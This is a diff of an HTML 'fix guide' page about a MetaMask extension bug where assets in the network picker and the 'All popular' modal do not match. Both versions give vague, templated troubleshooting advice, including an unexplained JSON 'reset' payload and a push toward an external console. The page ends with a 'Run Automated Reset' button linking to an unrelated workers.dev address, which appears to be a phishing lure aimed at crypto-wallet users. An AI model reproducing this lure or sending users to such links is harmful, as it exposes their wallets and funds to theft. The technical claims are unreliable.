@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Miss Match Between Network Picker – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
+        font-family: sans-serif;
         background: #0f111a;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff9455; }
     .btn {
         background: #ff7b2c;
         color: #000;
@@ -42,18 +42,18 @@
 <h1>Metamask Extension Bug Assets Miss Match Between Network Picker</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users observe a discrepancy between the assets listed in the Metamask network picker and those displayed in the modal window, which shows 'All popular' assets, even when a specific network is selected.</li>
+<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem may encounter a bug where there's a mismatch between the assets displayed in the network picker and those shown in the modal, specifically when it shows "All popular" assets.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a mismatch in the internal state of the Metamask extension, where the network picker and the modal window do not synchronize correctly, leading to incorrect asset listings.</li>
+<li>This error occurs due to a desynchronization between the network configuration and the asset list update mechanism within the Metamask extension, potentially triggered by network changes or updates to the asset lists.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Try resetting the Metamask extension by deleting its local storage: </li>
-<li><code>localStorage.clear()</code> in the browser console</li>
-<li>Manually removing the extension and reinstalling it</li>
-<li>Using the following json payload to reset the extension's internal state:</li>
+<li>To troubleshoot this issue, users can attempt the following manual overrides:</li>
+<li>Clear the browser cache and restart the browser to ensure a fresh start.</li>
+<li>Check for updates to the Metamask extension and install the latest version.</li>
+<li>Use the following JSON configuration to manually reset the asset list:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
 <span class="w">  </span><span class="nt">&quot;network&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;mainnet&quot;</span><span class="p">,</span>
@@ -61,14 +61,14 @@
 <span class="p">}</span>
 </code></pre></div>
 
-<p>For advanced troubleshooting, consider using an external console for more complex commands.</p>
+<p>Consider utilizing an external debugging console for deeper inspection of the extension's behavior.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and enabled</li>
-<li>Ethereum network selected in the Metamask network picker</li>
-<li>Latest version of the Metamask extension updated</li>
+<li>Metamask extension installed and updated to the latest version.</li>
+<li>A basic understanding of JSON configuration files.</li>
+<li>Familiarity with browser cache management and extension updates.</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li><li><a href="./archive/2026/06/metamask-extension-bug-incorrect-balance-for-aave-v3-wavax-toke.html">Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
